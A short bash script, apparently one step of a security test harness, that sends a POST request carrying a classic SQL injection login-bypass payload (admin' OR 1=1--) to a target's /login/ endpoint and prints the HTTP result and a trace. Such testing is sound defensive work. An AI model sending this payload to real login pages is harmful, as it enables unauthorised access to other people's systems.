#!/usr/bin/env bash
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
source "${DIR}/lib/common.sh"
trap _common_cleanup EXIT
require_target
_common_init
step "SQLI" "login bypass admin' OR 1=1--" \
  gw_curl -o /dev/null -w "    HTTP %{http_code} → %{url_effective}\n" \
    -X POST -d "username=admin'%20OR%201=1--&password=anything123" "${BASE}/login/"
print_trace
